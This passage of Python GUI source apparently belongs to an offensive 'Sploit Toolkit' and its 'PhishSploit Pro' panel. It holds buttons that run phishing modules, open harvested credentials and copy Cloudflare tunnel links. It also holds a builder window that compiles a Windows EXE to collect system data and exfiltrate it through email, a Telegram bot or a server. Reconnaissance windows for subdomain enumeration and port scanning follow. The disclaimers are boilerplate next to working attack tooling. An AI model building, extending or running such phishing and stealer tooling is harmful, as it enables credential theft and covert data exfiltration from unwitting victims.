        monospace_font = ctk.CTkFont(family="Consolas", size=13)

        header_frame = ctk.CTkFrame(win, fg_color="#0c0c0c", height=80, corner_radius=0)
        header_frame.pack(fill="x", pady=(0, 10))
        header_frame.pack_propagate(False)

        logo_label = ctk.CTkLabel(header_frame, text="PHISHSPLOIT PRO", font=title_font, text_color="#00ff88")
        logo_label.pack(side="left", padx=30)

        version_label = ctk.CTkLabel(header_frame, text=f"v{APP_VERSION} | Advanced Penetration Testing Suite",
                                     font=normal_font, text_color="#aaaaaa")
        version_label.pack(side="right", padx=30)

        warning_frame = ctk.CTkFrame(win, fg_color="#1a1a2e", corner_radius=15, border_width=2, border_color="#ff4d4d")
        warning_frame.pack(pady=15, padx=20, fill="x")

        warning_content = (
            "⚠️ IMPORTANT LEGAL WARNING ⚠️\n\n"
            "This software is intended strictly for educational and authorized penetration testing purposes. "
            "Operate this software in isolated, secure environments only.\n"
        )
        warning_label = ctk.CTkLabel(warning_frame, text=warning_content, text_color="#ffffff",
                                     justify="left", font=ctk.CTkFont(size=14, weight="bold"), wraplength=1100)
        warning_label.pack(padx=20, pady=15)

        button_frame = ctk.CTkFrame(win, fg_color="#1e1e2e", corner_radius=15)
        button_frame.pack(pady=20, padx=20)

        col_count = 2

        for idx, (name, path) in enumerate(scripts.items()):
            row = idx // col_count * 2
            col = idx % col_count

            # دکمه اجرای ماژول
            btn = ctk.CTkButton(
                button_frame,
                text=f"▶ Run {name} Module",
                width=220,
                height=50,
                fg_color="#2b5b84",
                hover_color="#1e4a70",
                font=ctk.CTkFont(size=14, weight="bold"),
                border_width=1,
                border_color="#3a7ebf",
                command=lambda p=path: run_script(p)
            )
            btn.grid(row=row, column=col, padx=20, pady=(10, 5))

            creds_btn = ctk.CTkButton(
                button_frame,
                text=f"📂 Open {name} Credentials",
                width=220,
                height=40,
                fg_color="#ff7f50",
                hover_color="#ff6347",
                font=ctk.CTkFont(family="Segoe UI", size=16, weight="bold"),
                command=lambda n=name: open_credentials(n)
            )
            creds_btn.grid(row=row + 1, column=col, padx=20, pady=(5, 10))

        output_frame = ctk.CTkFrame(win, fg_color="#1e1e2e", corner_radius=15)
        output_frame.pack(pady=15, padx=20, fill="both", expand=True)

        output_header = ctk.CTkFrame(output_frame, fg_color="transparent")
        output_header.pack(fill="x", padx=10, pady=(10, 5))

        output_label = ctk.CTkLabel(output_header, text="EXECUTION OUTPUT", font=header_font, text_color="#ffffff")
        output_label.pack(side="left")

        console_buttons_frame = ctk.CTkFrame(output_header, fg_color="transparent")
        console_buttons_frame.pack(side="right")

        copy_link_btn = ctk.CTkButton(
            console_buttons_frame,
            text="🌐 Copy Cloudflare Link",
            width=160,
            height=36,
            fg_color="#007ACC",
            hover_color="#1E90FF",
            font=ctk.CTkFont(family="Segoe UI", size=15, weight="bold"),
            text_color="#FFFFFF",
            corner_radius=12,
            border_width=2,
            border_color="#3399FF",
            command=copy_cloudflare_link,
            state="disabled"
        )
        copy_link_btn.pack(side="right", padx=(5, 0))

        copy_all_btn = ctk.CTkButton(console_buttons_frame, text="Copy All Text", width=100, height=28,
                                     fg_color="#6c757d", hover_color="#3cb4ac",
                                     font=ctk.CTkFont(size=12, weight="bold"),
                                     command=copy_output)
        copy_all_btn.pack(side="right", padx=(5, 0))

        clear_btn = ctk.CTkButton(console_buttons_frame, text="Clear Console", width=100, height=28,
                                  fg_color="#6c757d", hover_color="#5a6268", font=ctk.CTkFont(size=12, weight="bold"),
                                  command=clear_console)
        clear_btn.pack(side="right", padx=(5, 0))

        kill_btn = ctk.CTkButton(console_buttons_frame, text="Kill All Servers", width=140, height=28,
                                 fg_color="#ff4444", hover_color="#cc0000", font=ctk.CTkFont(size=12, weight="bold"),
                                 command=kill_all_processes)
        kill_btn.pack(side="right", padx=(5, 0))

        output_box = ctk.CTkTextbox(output_frame, corner_radius=10, font=monospace_font,
                                    fg_color="#0c0c0c", border_width=1, border_color="#333333")
        output_box.pack(pady=(0, 10), padx=10, fill="both", expand=True)
        output_box.configure(state="disabled")

        output_box.tag_config("running", foreground="#4ecdc4")
        output_box.tag_config("success", foreground="#00ff88")
        output_box.tag_config("error", foreground="#ff6b6b")
        output_box.tag_config("cloudflare", foreground="#00bfff")
        output_box.tag_config("output", foreground="#ffffff")

        class RightClickMenu:
            def __init__(self, text_widget):
                self.text_widget = text_widget
                self.menu = tk.Menu(win, tearoff=0)  # این خط را تغییر دهید
                self.menu.add_command(label="Copy Selected", command=self.copy_text)
                self.menu.add_command(label="Copy All", command=self.copy_all_text)
                self.menu.add_separator()
                self.menu.add_command(label="Clear", command=clear_console)
                text_widget.bind("<Button-3>", self.show_menu)

            def show_menu(self, event):
                try:
                    self.menu.tk_popup(event.x_root, event.y_root)
                finally:
                    self.menu.grab_release()

            def copy_text(self):
                try:
                    if self.text_widget.tag_ranges("sel"):
                        text = self.text_widget.get("sel.first", "sel.last")
                        win.clipboard_clear()
                        win.clipboard_append(text)
                        status_label.configure(text="Selected text copied to clipboard!")
                except:
                    pass

            def copy_all_text(self):
                copy_output()

        RightClickMenu(output_box)

        status_bar = ctk.CTkFrame(win, fg_color="#0c0c0c", height=30, corner_radius=0)
        status_bar.pack(fill="x", side="bottom")
        status_bar.pack_propagate(False)

        status_label = ctk.CTkLabel(status_bar, text="Ready | Select a module to execute", font=normal_font,
                                    text_color="#aaaaaa")
        status_label.pack(side="left", padx=20)

        exit_frame = ctk.CTkFrame(win, fg_color="transparent")
        exit_frame.pack(pady=20, fill="x", padx=20)

        exit_button = ctk.CTkButton(exit_frame, text="🚪 EXIT PROGRAM", width=400, height=60,
                                    fg_color="#d9534f", hover_color="#c9302c",
                                    font=ctk.CTkFont(size=18, weight="bold"),
                                    border_width=2, border_color="#ff6b6b", corner_radius=10,
                                    command=on_closing)
        exit_button.pack(pady=10)

        exit_note = ctk.CTkLabel(exit_frame,
                                 text="Close the application safely. All running processes will be terminated.",
                                 font=ctk.CTkFont(size=12), text_color="#cccccc")
        exit_note.pack()

        win.protocol("WM_DELETE_WINDOW", on_closing)




    def builder_window1(self):
        win = ctk.CTkToplevel(self)
        win.title("Python Builder")
        win.geometry("800x600")

        header_frame = ctk.CTkFrame(win)
        header_frame.pack(pady=10, padx=10, fill="x")

        ctk.CTkLabel(
            header_frame,
            text="⚠ Python Windows Builder ⚠",
            font=("Arial", 18, "bold"),
            text_color="#ff4444"
        ).pack(pady=(0, 5))

        ctk.CTkLabel(
            header_frame,
            text=(
                "✅Welcome to the ultimate Windows Builder for penetration testing and system automation.\n"
                "✅This tool allows you to configure multiple send methods (Email, Telegram, Server) and \n"
                "✅collect system data safely for testing purposes.\n\n"
                "⚠ Please use a test email account ONLY.\n"
                "✅For Gmail users: Generate an App Password here: https://myaccount.google.com/apppasswords\n"
                "XX Use responsibly. Unauthorized or malicious usage may be illegal and is strongly discouraged. XX"
            ),
            font=("Arial", 12),
            wraplength=750,
            justify="left",
            text_color="#ffffff"
        ).pack(pady=(0, 10))


        input_frame = ctk.CTkFrame(win)
        input_frame.pack(pady=10, padx=10, fill="x")

        ctk.CTkLabel(input_frame, text="Select Send Method:", font=("Arial", 14, "bold")).pack(anchor="w")
        self.method_var = ctk.StringVar(value="email")
        ctk.CTkRadioButton(input_frame, text="Email", variable=self.method_var, value="email").pack(anchor="w")
        ctk.CTkRadioButton(input_frame, text="Telegram", variable=self.method_var, value="telegram").pack(anchor="w")
        ctk.CTkRadioButton(input_frame, text="Server", variable=self.method_var, value="server").pack(anchor="w")


        self.sender_entry = ctk.CTkEntry(input_frame, placeholder_text="Sender Email (test account)", width=400)
        self.sender_entry.pack(pady=5)
        self.password_entry = ctk.CTkEntry(input_frame, placeholder_text="App Password (Gmail App Password)", width=400,
                                           show="*")
        self.password_entry.pack(pady=5)
        self.receiver_entry = ctk.CTkEntry(input_frame, placeholder_text="Receiver Email", width=400)
        self.receiver_entry.pack(pady=5)

        self.bot_token_entry = ctk.CTkEntry(input_frame, placeholder_text="Telegram Bot Token", width=400)
        self.bot_token_entry.pack(pady=5)
        self.chat_id_entry = ctk.CTkEntry(input_frame, placeholder_text="Telegram Chat ID", width=400)
        self.chat_id_entry.pack(pady=5)

        self.server_url_entry = ctk.CTkEntry(input_frame, placeholder_text="Server URL", width=400)
        self.server_url_entry.pack(pady=5)


        footer_frame = ctk.CTkFrame(win)
        footer_frame.pack(pady=5, padx=10, fill="x")

        ctk.CTkLabel(
            footer_frame,
            text="ℹ This builder is for testing and educational purposes only.\n"
                 "Using real accounts or deploying maliciously is illegal.\n"
                 "Follow instructions above for a safe test setup.\n"
                "✅Please Put your Credentials then Press Build Button.✅\n",
            font=("Arial", 13, "bold"),
            wraplength=750,
            justify="left",
            text_color="#ffee88"
        ).pack(pady=(5, 5))

        output_frame = ctk.CTkFrame(win)
        output_frame.pack(pady=10, padx=10, fill="both", expand=True)

        output_box = ctk.CTkTextbox(output_frame, width=750, height=350, font=("Consolas", 12))
        output_box.pack(side="left", fill="both", expand=True)

        scrollbar = ctk.CTkScrollbar(output_frame, command=output_box.yview)
        scrollbar.pack(side="right", fill="y")
        output_box.configure(yscrollcommand=scrollbar.set)

        sys.stdout = TextRedirector(output_box)
        sys.stderr = TextRedirector(output_box)
        sys.stdout = TextRedirector(output_box)


        def start_build():
            def run():
                base_dir = os.path.dirname(os.path.abspath(__file__))  # دایرکتوری فایل فعلی
                builder_path = os.path.join(base_dir, "..", "Windows", "WinSploit", "Builder.py")
                builder_path = os.path.abspath(builder_path)  # مسیر نهایی مطلق

                if not os.path.exists(builder_path):
                    raise FileNotFoundError(f"Builder.py not found at {builder_path}")

                print(f"[*] Found Builder.py at: {builder_path}")

                method = self.method_var.get()
                config = {"method": method}

                if method == "email":
                    config.update({
                        "sender": self.sender_entry.get(),
                        "password": self.password_entry.get(),
                        "receiver": self.receiver_entry.get()
                    })
                elif method == "telegram":
                    config.update({
                        "bot_token": self.bot_token_entry.get(),
                        "chat_id": self.chat_id_entry.get()
                    })
                elif method == "server":
                    config.update({"url": self.server_url_entry.get()})

                print("[*] Starting EXE build...")
                try:
                    build_exe(builder_path, config)
                    print("[+] EXE successfully built in 'dist' folder!\n")
                    messagebox.showinfo("Success", "Builder EXE created!\nCheck 'dist' folder.")

                    dist_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dist")
                    dist_folder = os.path.abspath(dist_folder)

                    print("[DEBUG] dist contents:", os.listdir(dist_folder))

                    exe_files = [f for f in os.listdir(dist_folder) if f.lower().endswith(".exe")]
                    if exe_files:
                        exe_path = os.path.join(dist_folder, exe_files[0])
                    else:
                        exe_path = None
                        print("[ERROR] No EXE file found in dist!")

                    def open_exe_location():
                        if exe_path and os.path.exists(exe_path):
                            subprocess.Popen(f'explorer /select,"{exe_path}"')
                        else:
                            messagebox.showerror("Error", "EXE file not found!")

                    show_btn = ctk.CTkButton(win, text="Show EXE", command=open_exe_location)
                    show_btn.pack(pady=10)

                except Exception as e:
                    print(f"[!] Error: {e}\n")
                    messagebox.showerror("Error", f"Failed to build EXE:\n{e}")

            threading.Thread(target=run, daemon=True).start()

        create_btn = ctk.CTkButton(win, text="CREATE EXE", command=start_build)
        create_btn.pack(pady=10)



    def firewall_detector_window(self):
        win = ctk.CTkToplevel(self)
        win.title("Firewall Detector")
        win.geometry("900x700")

        ip_label = ctk.CTkLabel(win, text="Enter target IP or URL:", font=("Arial", 16))
        ip_label.pack(pady=10)

        ip_entry = ctk.CTkEntry(win, width=400, placeholder_text="127.0.0.1", font=("Arial", 14))
        ip_entry.pack(pady=5)

        output_frame = ctk.CTkFrame(win)
        output_frame.pack(pady=15, fill="both", expand=True)

        output_box = ctk.CTkTextbox(output_frame, font=("Consolas", 12))
        output_box.pack(side="left", fill="both", expand=True)

        scrollbar = ctk.CTkScrollbar(output_frame, command=output_box.yview)
        scrollbar.pack(side="right", fill="y")
        output_box.configure(yscrollcommand=scrollbar.set)

        def run_firewall_scan(target_ip):
            try:
                detector = FirewallDetector(target_ip)
                results = detector.scan()

                for k, v in results.items():
                    output_box.insert("end", f"{k:<10} : {v}\n")
                    output_box.update()

                output_box.insert("end", f"\n[+] Scan completed at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

                def save_results():
                    save_path = os.path.join(os.getcwd(), f"firewall_results_{target_ip.replace(':', '_')}.txt")
                    with open(save_path, "w") as f:
                        for k, v in results.items():
                            f.write(f"{k:<10} : {v}\n")
                    output_box.insert("end", f"\n[+] Results saved to {save_path}\n")
                    self.show_notification("Success", f"Results saved to {save_path}")

                save_btn = ctk.CTkButton(win, text="Save Results", command=save_results)
                save_btn.pack(pady=10)

            except Exception as e:
                output_box.insert("end", f"[!] Error: {str(e)}\n")
                self.show_notification("Error", f"Firewall scan failed: {str(e)}", True)

        def start_scan():
            target_ip = ip_entry.get().strip()
            if not target_ip:
                output_box.insert("end", "[!] Please enter an IP or URL\n")
                return

            output_box.insert("end", f"[+] Starting firewall scan for {target_ip}...\n\n")
            output_box.update()

            threading.Thread(target=lambda: run_firewall_scan(target_ip), daemon=True).start()

        start_btn = ctk.CTkButton(win, text="Start Scan", command=start_scan)
        start_btn.pack(pady=10)



    def subdomain_enum_window(self):
        win = ctk.CTkToplevel(self)
        win.title("Subdomain Enumerator")
        win.geometry("900x700")

        domain_label = ctk.CTkLabel(win, text="Enter target domain:", font=("Arial", 16))
        domain_label.pack(pady=10)

        domain_entry = ctk.CTkEntry(win, width=400, placeholder_text="example.com", font=("Arial", 14))
        domain_entry.pack(pady=5)

        threads_label = ctk.CTkLabel(win, text="Threads (optional, default 20):", font=("Arial", 14))
        threads_label.pack(pady=5)

        threads_entry = ctk.CTkEntry(win, width=100, placeholder_text="20", font=("Arial", 14))
        threads_entry.pack(pady=5)

        output_frame = ctk.CTkFrame(win)
        output_frame.pack(pady=15, fill="both", expand=True)

        output_box = ctk.CTkTextbox(output_frame, font=("Consolas", 12))
        output_box.pack(side="left", fill="both", expand=True)

        scrollbar = ctk.CTkScrollbar(output_frame, command=output_box.yview)
        scrollbar.pack(side="right", fill="y")
        output_box.configure(yscrollcommand=scrollbar.set)

        wordlist_path = os.path.join(BASE_DIR, "Subdomains", "SubDomains.txt")

        def start_enumeration():
            domain = domain_entry.get().strip()
            threads_text = threads_entry.get().strip()
            threads = 20
            if threads_text.isdigit():
                threads = int(threads_text)

            if not domain:
                output_box.insert("end", "[!] Please enter a domain\n")
                return

            output_box.insert("end", f"[+] Starting subdomain enumeration for {domain}...\n\n")
            output_box.update()

            def run_enum():
                try:
                    try:
                        with open(wordlist_path, "r", encoding="utf-8") as f:
                            wordlist = [line.strip() for line in f if line.strip()]
                    except Exception as e:
                        output_box.insert("end", f"[!] Failed to load wordlist: {e}\n")
                        self.show_notification("Error", f"Failed to load wordlist: {e}", True)
                        return

                    total = len(wordlist)
                    found = []

                    def check_sub(sub, index):
                        urls = [f"http://{sub}.{domain}", f"https://{sub}.{domain}"]
                        for url in urls:
                            try:
                                r = requests.get(url, timeout=2)
                                if r.status_code < 400:
                                    found.append(url)
                                    break
                            except:
                                continue
                        progress = int((index + 1) / total * 100)
                        line = f"Scanning: {progress}% | {index + 1}/{total} subdomains"
                        output_box.delete("end-2l", "end-1l")  # Remove last line
                        output_box.insert("end", line + "\n")
                        output_box.see("end")

                    from concurrent.futures import ThreadPoolExecutor, as_completed
                    with ThreadPoolExecutor(max_workers=threads) as executor:
                        futures = {executor.submit(check_sub, sub, i): sub for i, sub in enumerate(wordlist)}
                        for future in as_completed(futures):
                            pass

                    output_box.insert("end", "\n[+] Enumeration Completed!\n")
                    if found:
                        output_box.insert("end", "[+] Found Subdomains:\n")
                        for sub in found:
                            output_box.insert("end", f"{sub}\n")
                    else:
                        output_box.insert("end", "[!] No subdomains found.\n")

                    def save_results():
                        save_path = os.path.join(BASE_DIR, "found_subdomains.txt")
                        with open(save_path, "w") as f:
                            for sub in found:
                                f.write(sub + "\n")
                        output_box.insert("end", f"\n[+] Results saved to {save_path}\n")
                        self.show_notification("Success", f"Results saved to {save_path}")

                    save_btn = ctk.CTkButton(win, text="Save Results", command=save_results)
                    save_btn.pack(pady=10)

                except Exception as e:
                    output_box.insert("end", f"[!] Error: {str(e)}\n")
                    self.show_notification("Error", f"Subdomain enumeration failed: {str(e)}", True)

            threading.Thread(target=run_enum, daemon=True).start()

        start_btn = ctk.CTkButton(win, text="Start Enumeration", command=start_enumeration)
        start_btn.pack(pady=10)






    def report_generator(self):
        webbrowser.open("https://github.com/AUX-441/Sploit/isuess")



    def settings(self):
        settings_win = ctk.CTkToplevel(self)
        settings_win.title("Settings - Sploit Toolkit")
        settings_win.geometry("1200x750")
        settings_win.resizable(False, False)

        settings_win.transient(self)
        settings_win.grab_set()

        main_frame = ctk.CTkFrame(settings_win, fg_color="transparent")
        main_frame.pack(fill="both", expand=True)

        tabview = ctk.CTkTabview(main_frame, width=850, height=650)
        tabview.pack(padx=20, pady=20, fill="both", expand=True)

        general_tab = tabview.add("General")
        appearance_tab = tabview.add("Appearance")
        security_tab = tabview.add("Security")
        about_tab = tabview.add("About")

        general_frame = ctk.CTkScrollableFrame(general_tab)
        general_frame.pack(fill="both", expand=True, padx=10, pady=10)

        ctk.CTkLabel(general_frame, text="General Settings",
                     font=("Arial", 16, "bold")).pack(pady=(10, 20))

        ctk.CTkLabel(general_frame, text="Default Report Save Location:",
                     font=("Arial", 14)).pack(anchor="w", padx=20, pady=(10, 5))

        save_path_frame = ctk.CTkFrame(general_frame, fg_color="transparent")
        save_path_frame.pack(anchor="w", padx=20, pady=(0, 20), fill="x")

        save_path_entry = ctk.CTkEntry(save_path_frame,
                                       placeholder_text="C:/Sploit/Reports",
                                       font=("Arial", 14),
                                       width=400)
        save_path_entry.pack(side="left", padx=(0, 10))
        save_path_entry.insert(0, self.config.get_setting('GENERAL', 'save_path',
                                                          os.path.join(os.path.expanduser("~"), "SploitReports")))

        def browse_save_path():
            path = filedialog.askdirectory()
            if path:
                save_path_entry.delete(0, "end")
                save_path_entry.insert(0, path)

        ctk.CTkButton(save_path_frame, text="Browse",
                      command=browse_save_path, width=100).pack(side="left")

        ctk.CTkLabel(general_frame, text="Default Thread Count:",
                     font=("Arial", 14)).pack(anchor="w", padx=20, pady=(10, 5))

        thread_slider = ctk.CTkSlider(general_frame, from_=5, to=50, number_of_steps=9)
        thread_slider.pack(anchor="w", padx=20, pady=(0, 10))
        thread_slider.set(int(self.config.get_setting('GENERAL', 'thread_count', 20)))

        thread_value = ctk.CTkLabel(general_frame,
                                    text=f"{self.config.get_setting('GENERAL', 'thread_count', 20)} threads",
                                    font=("Arial", 12))
        thread_value.pack(anchor="w", padx=20, pady=(0, 20))

        def update_thread_value(value):
            thread_value.configure(text=f"{int(value)} threads")

        thread_slider.configure(command=update_thread_value)

        ctk.CTkLabel(general_frame, text="Request Timeout (seconds):",
                     font=("Arial", 14)).pack(anchor="w", padx=20, pady=(10, 5))

        timeout_entry = ctk.CTkEntry(general_frame, width=150, font=("Arial", 14))
        timeout_entry.pack(anchor="w", padx=20, pady=(0, 20))
        timeout_entry.insert(0, self.config.get_setting('GENERAL', 'timeout', "10"))

        ctk.CTkLabel(general_frame, text="Notifications:",
                     font=("Arial", 14)).pack(anchor="w", padx=20, pady=(10, 5))

        notif_frame = ctk.CTkFrame(general_frame, fg_color="transparent")
        notif_frame.pack(anchor="w", padx=20, pady=(0, 20), fill="x")

        sound_var = ctk.StringVar(value=self.config.get_setting('GENERAL', 'sound_notifications', 'on'))
        sound_notif = ctk.CTkCheckBox(notif_frame, text="Play sound when scan completes",
                                      variable=sound_var, onvalue="on", offvalue="off")
        sound_notif.pack(anchor="w", pady=5)
        if sound_var.get() == "on":
            sound_notif.select()

        popup_var = ctk.StringVar(value=self.config.get_setting('GENERAL', 'popup_notifications', 'on'))
        popup_notif = ctk.CTkCheckBox(notif_frame, text="Show popup notifications",
                                      variable=popup_var, onvalue="on", offvalue="off")
        popup_notif.pack(anchor="w", pady=5)
        if popup_var.get() == "on":
            popup_notif.select()

        appearance_frame = ctk.CTkScrollableFrame(appearance_tab)
        appearance_frame.pack(fill="both", expand=True, padx=10, pady=10)

        ctk.CTkLabel(appearance_frame, text="Appearance Settings",
                     font=("Arial", 16, "bold")).pack(pady=(10, 20))

        ctk.CTkLabel(appearance_frame, text="Application Theme:",
                     font=("Arial", 14)).pack(anchor="w", padx=20, pady=(10, 5))

        theme_var = ctk.StringVar(value=self.config.get_setting('APPEARANCE', 'theme', 'Dark'))
        theme_frame = ctk.CTkFrame(appearance_frame, fg_color="transparent")
        theme_frame.pack(anchor="w", padx=20, pady=(0, 20), fill="x")

        dark_theme = ctk.CTkRadioButton(theme_frame, text="Dark", variable=theme_var, value="Dark")
        dark_theme.pack(side="left", padx=(0, 20))

        light_theme = ctk.CTkRadioButton(theme_frame, text="Light", variable=theme_var, value="Light")
        light_theme.pack(side="left")

        ctk.CTkLabel(appearance_frame, text="Color Theme:",
                     font=("Arial", 14)).pack(anchor="w", padx=20, pady=(10, 5))

        color_combo = ctk.CTkComboBox(appearance_frame,
                                      values=["Blue", "Green", "Dark-Blue", "Purple"],
                                      font=("Arial", 14),
                                      width=200)
        color_combo.pack(anchor="w", padx=20, pady=(0, 20))
        color_combo.set(self.config.get_setting('APPEARANCE', 'color_theme', 'Blue'))

        ctk.CTkLabel(appearance_frame, text="UI Scaling:",
                     font=("Arial", 14)).pack(anchor="w", padx=20, pady=(10, 5))

        scaling_slider = ctk.CTkSlider(appearance_frame, from_=80, to=120, number_of_steps=4)
        scaling_slider.pack(anchor="w", padx=20, pady=(0, 10))
        scaling_slider.set(int(self.config.get_setting('APPEARANCE', 'ui_scaling', 100)))

        scaling_value = ctk.CTkLabel(appearance_frame,
                                     text=f"{self.config.get_setting('APPEARANCE', 'ui_scaling', 100)}%",
                                     font=("Arial", 12))
        scaling_value.pack(anchor="w", padx=20, pady=(0, 20))

        def update_scaling_value(value):
            scaling_value.configure(text=f"{int(value)}%")

        scaling_slider.configure(command=update_scaling_value)

        security_frame = ctk.CTkScrollableFrame(security_tab)
        security_frame.pack(fill="both", expand=True, padx=10, pady=10)

        ctk.CTkLabel(security_frame, text="Security Settings",
                     font=("Arial", 16, "bold")).pack(pady=(10, 20))

        ctk.CTkLabel(security_frame, text="Proxy Configuration:",
                     font=("Arial", 14)).pack(anchor="w", padx=20, pady=(10, 5))

        proxy_frame = ctk.CTkFrame(security_frame, fg_color="transparent")
        proxy_frame.pack(anchor="w", padx=20, pady=(0, 10), fill="x")

        ctk.CTkLabel(proxy_frame, text="Host:", font=("Arial", 12)).pack(side="left", padx=(0, 5))
        proxy_host = ctk.CTkEntry(proxy_frame, width=150, placeholder_text="proxy.example.com")
        proxy_host.pack(side="left", padx=(0, 10))
        proxy_host.insert(0, self.config.get_setting('SECURITY', 'proxy_host', ''))

        ctk.CTkLabel(proxy_frame, text="Port:", font=("Arial", 12)).pack(side="left", padx=(0, 5))
        proxy_port = ctk.CTkEntry(proxy_frame, width=80, placeholder_text="8080")
        proxy_port.pack(side="left")
        proxy_port.insert(0, self.config.get_setting('SECURITY', 'proxy_port', ''))

        ctk.CTkLabel(security_frame, text="Request Delay (seconds):",
                     font=("Arial", 14)).pack(anchor="w", padx=20, pady=(20, 5))

        delay_slider = ctk.CTkSlider(security_frame, from_=0, to=5, number_of_steps=10)
        delay_slider.pack(anchor="w", padx=20, pady=(0, 10))
        delay_slider.set(float(self.config.get_setting('SECURITY', 'request_delay', 0.5)))

        delay_value = ctk.CTkLabel(security_frame,
                                   text=f"{self.config.get_setting('SECURITY', 'request_delay', 0.5)} seconds",
                                   font=("Arial", 12))
        delay_value.pack(anchor="w", padx=20, pady=(0, 20))

        def update_delay_value(value):
            delay_value.configure(text=f"{float(value):.1f} seconds")

        delay_slider.configure(command=update_delay_value)

        ctk.CTkLabel(security_frame, text="Custom User Agent:",
                     font=("Arial", 14)).pack(anchor="w", padx=20, pady=(10, 5))

        ua_entry = ctk.CTkEntry(security_frame,
                                placeholder_text="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                                width=500,
                                font=("Arial", 12))
        ua_entry.pack(anchor="w", padx=20, pady=(0, 20))
        ua_entry.insert(0, self.config.get_setting('SECURITY', 'user_agent',
                                                   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'))

        about_frame = ctk.CTkScrollableFrame(about_tab)
        about_frame.pack(fill="both", expand=True, padx=10, pady=10)

        ctk.CTkLabel(about_frame, text="🔐 Sploit Toolkit",
                     font=("Arial", 28, "bold"), text_color="#4cc9f0").pack(pady=(10, 20))

        ctk.CTkLabel(about_frame, text="Version 1.0.0",
                     font=("Arial", 14), text_color="#b0b0b0").pack(pady=(0, 30))

        def add_feature_card(parent, icon, title, description, color="#ffffff"):
            card = ctk.CTkFrame(parent, corner_radius=12, fg_color="#2b2d42", border_width=1, border_color="#555555")
            card.pack(fill="x", padx=20, pady=10)

            top_frame = ctk.CTkFrame(card, fg_color="transparent")
            top_frame.pack(fill="x", pady=10, padx=10)

            ctk.CTkLabel(top_frame, text=icon, font=("Arial", 24)).pack(side="left")
            ctk.CTkLabel(top_frame, text=title, font=("Arial", 16, "bold"), text_color=color).pack(side="left", padx=10)

            ctk.CTkLabel(card, text=description, font=("Arial", 14), wraplength=1000, justify="left").pack(fill="x",
                                                                                                           padx=10,
                                                                                                           pady=(0, 10))
        add_feature_card(about_frame, "🌐", "Web Security Tools",
                         "SQL Injection tests, Subdirectory Finder, Full Site Scan, Admin Page Finder, Brute Force Simulator.")

        add_feature_card(about_frame, "🔒", "Network & Infrastructure",
                         "SSL/TLS Checker, Header Analyzer, Firewall Detector, DNS & Subdomain Enumeration, Port Scanner.")

        add_feature_card(about_frame, "⚙️", "Customization & UX",
                         "Dark/Light themes, color schemes, UI scaling, notifications, sounds, and user-friendly interface.")

        add_feature_card(about_frame, "💾", "Reports & Logs",
                         "Save reports easily, manage scan history, and generate detailed logs for each operation.")

        add_feature_card(about_frame, "🚀", "Performance & Cross-Platform",
                         "Optimized for speed and accuracy, works on Windows, Linux, and Mac environments.")

        team_card = ctk.CTkFrame(about_frame, corner_radius=12, fg_color="#2b2d42", border_width=1,
                                 border_color="#555555")
        team_card.pack(fill="x", padx=20, pady=20)

        ctk.CTkLabel(team_card, text="👨‍💻 Developed by AUX-441 Team", font=("Arial", 16, "bold"),
                     text_color="#4cc9f0").pack(pady=(10, 5))
        ctk.CTkLabel(team_card, text="🌐 Website & Docs: https://github.com/AUX-441/Sploit", font=("Arial", 14)).pack(
            pady=5)
        ctk.CTkLabel(team_card, text="🐛 Report issues or contribute on GitHub", font=("Arial", 14)).pack(pady=(5, 10))

        action_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
        action_frame.pack(side="bottom", fill="x", pady=(0, 20))

        def save_settings():
            self.config.config['GENERAL']['save_path'] = save_path_entry.get()
            self.config.config['GENERAL']['thread_count'] = str(int(thread_slider.get()))
            self.config.config['GENERAL']['timeout'] = timeout_entry.get()
            self.config.config['GENERAL']['sound_notifications'] = sound_var.get()
            self.config.config['GENERAL']['popup_notifications'] = popup_var.get()

            self.config.config['APPEARANCE']['theme'] = theme_var.get()
            self.config.config['APPEARANCE']['color_theme'] = color_combo.get()
            self.config.config['APPEARANCE']['ui_scaling'] = str(int(scaling_slider.get()))

            self.config.config['SECURITY']['proxy_host'] = proxy_host.get()
            self.config.config['SECURITY']['proxy_port'] = proxy_port.get()
            self.config.config['SECURITY']['request_delay'] = str(delay_slider.get())
            self.config.config['SECURITY']['user_agent'] = ua_entry.get()

            self.config.save_config()

            ctk.set_appearance_mode(theme_var.get().lower())
            ctk.set_default_color_theme(color_combo.get().lower())

            self.show_notification("Success", "Settings saved successfully!")
            settings_win.destroy()

        def cancel_settings():
            settings_win.destroy()

        def reset_settings():
            self.config.create_default_config()
            self.show_notification("Info", "Settings reset to defaults.")
            settings_win.destroy()
            self.settings()

        save_btn = ctk.CTkButton(action_frame, text="Save", command=save_settings,
                                 width=120, height=50, fg_color="#2b8a3e",
                                 font=("Arial", 16, "bold"))
        save_btn.pack(side="left", padx=10, pady=10)

        cancel_btn = ctk.CTkButton(action_frame, text="Cancel", command=cancel_settings,
                                   width=120, height=50, fg_color="#c92a2a",
                                   font=("Arial", 16, "bold"))
        cancel_btn.pack(side="left", padx=10, pady=10)

        reset_btn = ctk.CTkButton(action_frame, text="Reset Defaults", command=reset_settings,
                                  width=150, height=50,
                                  font=("Arial", 16, "bold"))
        reset_btn.pack(side="left", padx=10, pady=10)




    def show_popup(self, title, message):
        popup = ctk.CTkToplevel(self)
        popup.title(title)
        popup.geometry("400x200")
        popup.transient(self)
        popup.grab_set()

        label = ctk.CTkLabel(popup, text=message, font=("Arial", 14))
        label.pack(pady=20, padx=20)

        ok_btn = ctk.CTkButton(popup, text="OK", command=popup.destroy)
        ok_btn.pack(pady=10)



    def scan_ports(self):
        win = ctk.CTkToplevel(self)
        win.title("Port Scanner")
        win.geometry("800x600")

        main_frame = ctk.CTkFrame(win)
        main_frame.pack(fill="both", expand=True, padx=20, pady=20)

        input_frame = ctk.CTkFrame(main_frame)
        input_frame.pack(fill="x", pady=(0, 20))

        label = ctk.CTkLabel(input_frame, text="Enter target host or IP:", font=("Arial", 16))
        label.pack(pady=10)

        target_entry = ctk.CTkEntry(input_frame, width=400, placeholder_text="example.com or 192.168.1.1",
                                    font=("Arial", 14))
        target_entry.pack(pady=5)

        ports_label = ctk.CTkLabel(input_frame, text="Ports to scan (comma separated):", font=("Arial", 14))
        ports_label.pack(pady=5)

        ports_entry = ctk.CTkEntry(input_frame, width=400, placeholder_text="Example : 1000", font=("Arial", 14))
        ports_entry.pack(pady=5)

